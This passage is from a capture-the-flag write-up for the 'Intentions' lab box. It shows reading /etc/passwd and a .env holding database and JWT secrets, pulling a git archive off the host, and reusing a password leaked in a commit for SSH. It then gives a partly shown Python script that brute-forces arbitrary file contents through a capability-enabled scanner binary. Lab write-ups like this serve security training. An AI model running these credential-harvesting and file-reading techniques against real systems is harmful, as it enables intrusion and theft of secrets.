+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">4</span> legal  legal  <span class="m">4096</span> Jun <span class="m">19</span> 13:09 legal
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">4</span> steven steven <span class="m">4096</span> Jun <span class="m">19</span> 13:09 steven
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@intentions:/var/www/html/intentions$ cat /etc/passwd <span class="p">|</span> grep sh$
+</span></span><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">steven❌1000:1000:steven:/home/steven:/bin/bash
+</span></span><span class="line"><span class="cl">greg❌1001:1001::/home/greg:/bin/sh
+</span></span><span class="line"><span class="cl">legal❌1002:1002:,,,:/home/legal:/bin/bash
+</span></span></code></pre></div><p>A <code>.gitignore</code> file exists in the public directory, indicating there&rsquo;s a git repo somewhere.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@intentions:/var/www/html/intentions/storage/app/public$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">32</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">6</span> www-data www-data <span class="m">4096</span> Jul <span class="m">16</span> 07:15 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> www-data www-data <span class="m">4096</span> Feb  <span class="m">2</span> 16:41 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data   <span class="m">14</span> Apr <span class="m">12</span>  <span class="m">2022</span> .gitignore
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root     root     <span class="m">4096</span> Feb  <span class="m">2</span> 01:09 animals
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root     root     <span class="m">4096</span> Feb  <span class="m">2</span> 01:08 architecture
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root     root     <span class="m">4096</span> Feb  <span class="m">2</span> 01:07 food
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root     root     <span class="m">4096</span> Feb  <span class="m">2</span> 01:07 nature
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data   <span class="m">95</span> Jul <span class="m">16</span> 07:15 shell.php
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@intentions:/var/www/html/intentions/storage/app/public$ cat .gitignore
+</span></span><span class="line"><span class="cl">*
+</span></span><span class="line"><span class="cl">!.gitignore
+</span></span></code></pre></div><p>Going up a few directories, identified a git repository situated at <code>/var/www/html/intentions</code>, as indicated by the presence of the <code>.git/</code> directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@intentions:/var/www/html/intentions$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">820</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">14</span> root     root       <span class="m">4096</span> Feb  <span class="m">2</span> 17:55 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">3</span> root     root       <span class="m">4096</span> Feb  <span class="m">2</span> 17:55 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root     root       <span class="m">1068</span> Feb  <span class="m">2</span> 17:38 .env
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">8</span> root     root       <span class="m">4096</span> Feb  <span class="m">3</span> 00:51 .git
+</span></span><span class="line"><span class="cl">...snip...
+</span></span></code></pre></div><p>The <code>.env</code> file contains several interesting details including the application key, database username and password, and the JWT secret.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">remote<span class="o">)</span> www-data@intentions:/var/www/html/intentions$ cat .env
+</span></span><span class="line"><span class="cl"><span class="nv">APP_NAME</span><span class="o">=</span>Intentions
+</span></span><span class="line"><span class="cl"><span class="nv">APP_ENV</span><span class="o">=</span>production
+</span></span><span class="line"><span class="cl"><span class="nv">APP_KEY</span><span class="o">=</span>base64:YDGHFO792XTVdInb9gGESbGCyRDsAIRCkKoIMwkyHHI<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="nv">APP_DEBUG</span><span class="o">=</span><span class="nb">false</span>
+</span></span><span class="line"><span class="cl"><span class="nv">APP_URL</span><span class="o">=</span>http://intentions.htb
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="nv">DB_CONNECTION</span><span class="o">=</span>mysql
+</span></span><span class="line"><span class="cl"><span class="nv">DB_HOST</span><span class="o">=</span>localhost
+</span></span><span class="line"><span class="cl"><span class="nv">DB_PORT</span><span class="o">=</span><span class="m">3306</span>
+</span></span><span class="line"><span class="cl"><span class="nv">DB_DATABASE</span><span class="o">=</span>intentions
+</span></span><span class="line"><span class="cl"><span class="nv">DB_USERNAME</span><span class="o">=</span>laravel
+</span></span><span class="line"><span class="cl"><span class="nv">DB_PASSWORD</span><span class="o">=</span>02mDWOgsOga03G385!!3Plcx
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="nv">JWT_SECRET</span><span class="o">=</span>yVH9RCGPMXyzNLoXrEsOl0klZi3MAxMHcMlRAnlobuSO8WNtLHStPiOUUgfmbwPt
+</span></span></code></pre></div><p>I couldn&rsquo;t enumerate the repository because of an ownership issue of root directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@intentions:/var/www/html/intentions$ git log
+</span></span><span class="line"><span class="cl">fatal: detected dubious ownership in repository at <span class="s1">&#39;/var/www/html/intentions&#39;</span>
+</span></span><span class="line"><span class="cl">To add an exception <span class="k">for</span> this directory, call:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    git config --global --add safe.directory /var/www/html/intentions
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@intentions:/var/www/html/intentions$ git config --global --add safe.directory /var/www/html/intentions
+</span></span><span class="line"><span class="cl">error: could not lock config file /var/www/.gitconfig: Permission denied<span class="o">)</span>
+</span></span></code></pre></div><p>The only viable approach for to enumerate the repository involves archiving it and subsequently downloading the generated archive.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@intentions:/tmp$ tar -cf intentions.tar /var/www/html/intentions
+</span></span><span class="line"><span class="cl">tar: Removing leading <span class="sb">`</span>/<span class="err">&#39;</span> from member names
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$ download intentions.tar
+</span></span><span class="line"><span class="cl">intentions.tar  100.0% • 270.5/270.5 MB • 1.6 MB/s • 0:00:00
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:53:25<span class="o">]</span> downloaded 270.51Mi━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━B in 5.0 minutes and <span class="m">11</span> seconds                                        download.py:71
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$
+</span></span></code></pre></div><p>Judging by the commit message, it&rsquo;s possible that the second-to-last commit in the git log could reveal something of interest.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; git lg
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1f29dfd steve    <span class="o">(</span><span class="m">5</span> months ago<span class="o">)</span> - Fix webpack <span class="k">for</span> production <span class="o">(</span>HEAD -&gt; master<span class="o">)</span>
+</span></span><span class="line"><span class="cl">f7c903a greg     <span class="o">(</span><span class="m">5</span> months ago<span class="o">)</span> - Test cases did not work on steve<span class="err">&#39;</span>s <span class="nb">local</span> database, switching to user factory per his advice
+</span></span><span class="line"><span class="cl">36b4287 greg     <span class="o">(</span><span class="m">5</span> months ago<span class="o">)</span> - Adding <span class="nb">test</span> cases <span class="k">for</span> the API!
+</span></span><span class="line"><span class="cl">d7ef022 steve    <span class="o">(</span><span class="m">5</span> months ago<span class="o">)</span> - Initial v2 commit
+</span></span><span class="line"><span class="cl"><span class="o">(</span>END<span class="o">)</span>
+</span></span></code></pre></div><p>The diff for the mentioned commit contains the password for the user, greg → <code>greg:Gr3g1sTh3B3stDev3l0per!1998!</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gi">&gt; git show f7c903a
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>
+</span></span><span class="line"><span class="cl">commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
+</span></span><span class="line"><span class="cl">Author: greg &lt;greg@intentions.htb&gt;
+</span></span><span class="line"><span class="cl">Date:   Thu Jan 26 09:21:52 2023 +0100
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Test cases did not work on steve&#39;s local database, switching to user factory per his advice
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
+</span></span></span><span class="line"><span class="cl"><span class="gh">index f57e37b..0586d51 100644
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/tests/Feature/Helper.php
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/tests/Feature/Helper.php
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -8,12 +8,14 @@ class Helper extends TestCase
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span> {
+</span></span><span class="line"><span class="cl">     public static function getToken($test, $admin = false) {
+</span></span><span class="line"><span class="cl">         if($admin) {
+</span></span><span class="line"><span class="cl"><span class="gd">-            $res = $test-&gt;postJson(&#39;/api/v1/auth/login&#39;, [&#39;email&#39; =&gt; &#39;greg@intentions.htb&#39;, &#39;password&#39; =&gt; &#39;Gr3g1sTh3B3stDev3l0per!1998!&#39;]);
+</span></span></span><span class="line"><span class="cl"><span class="gd">-            return $res-&gt;headers-&gt;get(&#39;Authorization&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+            $user = User::factory()-&gt;admin()-&gt;create();
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>         }
+</span></span><span class="line"><span class="cl">         else {
+</span></span><span class="line"><span class="cl"><span class="gd">-            $res = $test-&gt;postJson(&#39;/api/v1/auth/login&#39;, [&#39;email&#39; =&gt; &#39;greg_user@intentions.htb&#39;, &#39;password&#39; =&gt; &#39;Gr3g1sTh3B3stDev3l0per!1998!&#39;]);
+</span></span></span><span class="line"><span class="cl"><span class="gd">-            return $res-&gt;headers-&gt;get(&#39;Authorization&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+            $user = User::factory()-&gt;create();
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>         }
+</span></span><span class="line"><span class="cl"><span class="gi">+
+</span></span></span><span class="line"><span class="cl"><span class="gi">+        $token = Auth::login($user);
+</span></span></span><span class="line"><span class="cl"><span class="gi">+        $user-&gt;delete();
+</span></span></span><span class="line"><span class="cl"><span class="gi">+        return $token;
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>     }
+</span></span><span class="line"><span class="cl"> }
+</span></span></code></pre></div><p>Although the new credentials didn&rsquo;t provide any additional insights on the website, they were reused for Greg&rsquo;s local account. As a result, logged in through SSH.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$ connect greg:Gr3g1sTh3B3stDev3l0per!1998!@intentions.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>06:04:53<span class="o">]</span> intentions.htb:22: upgrading from /usr/bin/dash to /usr/bin/bash                          manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">[</span>06:04:54<span class="o">]</span> intentions.htb:22: loaded known host from db                                              manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/home/greg$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>greg<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>greg<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>greg<span class="o">)</span>,1003<span class="o">(</span>scanner<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/home/greg$
+</span></span></code></pre></div><hr>
+<h2 id="privilege-escalation-to-root" class="relative group">Privilege Escalation to root <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-to-root" aria-label="Anchor">#</a></span></h2><hr>
+<p>Unfortunately, Greg lacks sudo privileges</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/home/greg$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> greg:
+</span></span><span class="line"><span class="cl">Sorry, user greg may not run sudo on intentions.
+</span></span></code></pre></div><p>Greg, interestingly, is also a member of the scanner group. While searching for files accessible to the group, discovered the scanner binary, owned by root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/home/greg$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>greg<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>greg<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>greg<span class="o">)</span>,1003<span class="o">(</span>scanner<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/home/greg$ find / -group scanner 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/opt/scanner
+</span></span><span class="line"><span class="cl">/opt/scanner/scanner
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/home/greg$ ls -la /opt/scanner/scanner
+</span></span><span class="line"><span class="cl">-rwxr-x--- <span class="m">1</span> root scanner <span class="m">1437696</span> Jun <span class="m">19</span> 11:18 /opt/scanner/scanner
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/home/greg$ file /opt/scanner/scanner
+</span></span><span class="line"><span class="cl">/opt/scanner/scanner: ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, Go <span class="nv">BuildID</span><span class="o">=</span>a7sTitVjvr1qc4Ngg3jt/LY6QPsAiDYUOHaK7gUXN/5aWVPmSwER6KHrDxGzr4/SUP48whD2UTLJ-Q2kLmf, stripped
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/home/greg$ getcap /opt/scanner/scanner
+</span></span><span class="line"><span class="cl">/opt/scanner/scanner <span class="nv">cap_dac_read_search</span><span class="o">=</span>ep
+</span></span></code></pre></div><p>The capability the file has, <code>CAP_DAC_READ_SEARCH</code> essentially means it can read any file on the box.</p>
+<blockquote>
+<pre><code>CAP_DAC_READ_SEARCH
+     •  Bypass file read permission checks and directory read
+        and execute permission checks;
+     •  invoke open_by_handle_at(2);
+     •  use the linkat(2) AT_EMPTY_PATH flag to create a link
+        to a file referred to by a file descriptor.
+</code></pre>
+</blockquote>
+<p>As there no manual page entries were available for <code>scanner</code>, the <code>-h</code> or <code>--help</code> options are the most effective approach to gather additional information about the binary. According to the help message, it appears to be a utility that uses MD5 hashes to identify copyrighted data.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/home/greg$ /opt/scanner/scanner --help
+</span></span><span class="line"><span class="cl">The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and <span class="k">return</span> matches.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    This utility has been developed to <span class="nb">help</span> identify copyrighted material that have previously been submitted on the platform.
+</span></span><span class="line"><span class="cl">    This tool can also be used to check <span class="k">for</span> duplicate images to avoid having multiple of the same photos in the gallery.
+</span></span><span class="line"><span class="cl">    File matching are evaluated by comparing an MD5 <span class="nb">hash</span> of the file contents or a portion of the file contents against those submitted in the <span class="nb">hash</span> file.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    The <span class="nb">hash</span> blacklist file should be maintained as a single LABEL:MD5 per line.
+</span></span><span class="line"><span class="cl">    Please avoid using extra colons in the label as that is not currently supported.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Expected output:
+</span></span><span class="line"><span class="cl">    1. Empty <span class="k">if</span> no matches found
+</span></span><span class="line"><span class="cl">    2. A line <span class="k">for</span> every match, example:
+</span></span><span class="line"><span class="cl">        <span class="o">[</span>+<span class="o">]</span> <span class="o">{</span>LABEL<span class="o">}</span> matches <span class="o">{</span>FILE<span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  -c string
+</span></span><span class="line"><span class="cl">        Path to image file to check. Cannot be combined with -d
+</span></span><span class="line"><span class="cl">  -d string
+</span></span><span class="line"><span class="cl">        Path to image directory to check. Cannot be combined with -c
+</span></span><span class="line"><span class="cl">  -h string
+</span></span><span class="line"><span class="cl">        Path to colon separated <span class="nb">hash</span> file. Not compatible with -p
+</span></span><span class="line"><span class="cl">  -l int
+</span></span><span class="line"><span class="cl">        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to <span class="nb">false</span> positives. <span class="o">(</span>default 500<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  -p    <span class="o">[</span>Debug<span class="o">]</span> Print calculated file hash. Only compatible with -c
+</span></span><span class="line"><span class="cl">  -s string
+</span></span><span class="line"><span class="cl">        Specific <span class="nb">hash</span> to check against. Not compatible with -h
+</span></span></code></pre></div><p>Also, found a bash script in the home directory that executes scanner against some documents in <code>/home/legal/uploads</code>. Unfortunately, greg has no write access in that directory, but scanner does via the capability.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/home/greg$ cat dmca_check.sh
+</span></span><span class="line"><span class="cl">/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
+</span></span></code></pre></div><p>When trying to test scanner&rsquo;s functionality, I noticed that the hashes were different</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ <span class="nb">echo</span> -n <span class="s1">&#39;1234&#39;</span> &gt; scanner_test
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ md5sum scanner_test
+</span></span><span class="line"><span class="cl">81dc9bdb52d04dc20036dbd8313ed055  scanner_test
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ /opt/scanner/scanner -c ./scanner_test -s <span class="s1">&#39;81dc9bdb52d04dc20036dbd8313ed055&#39;</span> -p
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> ./scanner_test has <span class="nb">hash</span> 8b2460b545079292869605c18cc18c81
+</span></span></code></pre></div><p>According to the information from the help page, the number of hashed bytes can be defined using the <code>-l</code> option. By setting the number of bytes to 4, as in the example provided, the correct hash is generated. This explains why the mismatched hashes when the <code>-l</code> option wasn&rsquo;t utilized, as the default size is 500 bytes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s <span class="s1">&#39;81dc9bdb52d04dc20036dbd8313ed055&#39;</span> -p -l <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> /tmp/scanner_test has <span class="nb">hash</span> c4ca4238a0b923820dcc509a6f75849b
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ <span class="nb">echo</span> -n <span class="s1">&#39;1&#39;</span> <span class="p">|</span> md5sum -
+</span></span><span class="line"><span class="cl">c4ca4238a0b923820dcc509a6f75849b  -
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s <span class="s1">&#39;81dc9bdb52d04dc20036dbd8313ed055&#39;</span> -p -l <span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> /tmp/scanner_test has <span class="nb">hash</span> c20ad4d76fe97759aa27a0c99bff6710
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ <span class="nb">echo</span> -n <span class="s1">&#39;12&#39;</span> <span class="p">|</span> md5sum -
+</span></span><span class="line"><span class="cl">c20ad4d76fe97759aa27a0c99bff6710  -
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s <span class="s1">&#39;81dc9bdb52d04dc20036dbd8313ed055&#39;</span> -p -l <span class="m">3</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> /tmp/scanner_test has <span class="nb">hash</span> 202cb962ac59075b964b07152d234b70
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ <span class="nb">echo</span> -n <span class="s1">&#39;123&#39;</span> <span class="p">|</span> md5sum -
+</span></span><span class="line"><span class="cl">202cb962ac59075b964b07152d234b70  -
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s <span class="s1">&#39;81dc9bdb52d04dc20036dbd8313ed055&#39;</span> -p -l <span class="m">4</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> /tmp/scanner_test has <span class="nb">hash</span> 81dc9bdb52d04dc20036dbd8313ed055
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 81dc9bdb52d04dc20036dbd8313ed055 matches /tmp/scanner_test
+</span></span></code></pre></div><p>This functionality could potentially be exploited to read files by essentially brute-forcing the hashes. Given that the binary is owned by the root user, ideally it could be used to read any file on the system. It would take too long to do this manually, so wrote a python script to automate the process.</p>
+<h3 id="brute-force-automation-script" class="relative group">Brute-force automation script <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#brute-force-automation-script" aria-label="Anchor">#</a></span></h3><p>The script consists of the following functions:</p>
+<ul>
+<li><code>grab_hash()</code>: Retrieves the hash generated by the <code>scanner</code> binary</li>
+<li><code>gen_hash()</code>: Generates an MD5 hash.</li>
+<li><code>correct_char()</code>: Compares hashes obtained from both functions to identify the character corresponding to the hash produced by the <code>scanner</code> binary</li>
+</ul>
+<p>The script accepts a filename as a parameter and then initiates an infinite loop with the counter beginning at 1. Within each loop iteration:</p>
+<ul>
+<li>The <code>grab_hash()</code> function is invoked with increasing hash lengths.</li>
+<li>The hash obtained from <code>grab_hash()</code> is passed to <code>correct_char()</code> to identify the correct character.</li>
+<li>The <code>correct_char()</code> generates md5 hashes for the decoded data + a character from the charset and matches it to the hash from scanner. If a match is found, the character is appended to the decoded data.</li>
+<li>Within <code>correct_char()</code>, MD5 hashes are generated for the decoded data plus a character from the charset, and compared to the hash obtained from the <code>scanner</code>. If a match is found, the character is added to the decoded data.</li>
+<li>In case no match is found, the infinite loop terminates, indicating either the complete data retrieval or the absence of the target character within the character set.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">count</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">grab_hash</span><span class="p">(</span><span class="n">fileName</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">hash_length</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">hash_value</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;test_hash&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># command = f&#34;/opt/scanner/scanner -c {fileName} -s {hash_value} -p -l {hash_length}&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># os.system(command)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;/opt/scanner/scanner -c </span><span class="si">{</span><span class="n">fileName</span><span class="si">}</span><span class="s2"> -s </span><span class="si">{</span><span class="n">hash_value</span><span class="si">}</span><span class="s2"> -p -l </span><span class="si">{</span><span class="n">hash_length</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">scanner_output</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">stdout</span>
+</span></span><span class="line"><span class="cl">    <span class="n">scanner_err</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">scanner_err</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error: </span><span class="si">{</span><span class="n">scanner_err</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(scanner_output)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">hash</span> <span class="o">=</span> <span class="n">scanner_output</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">)[</span><span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(hash)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gen_hash</span><span class="p">(</span><span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hashed_text</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashed_text</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
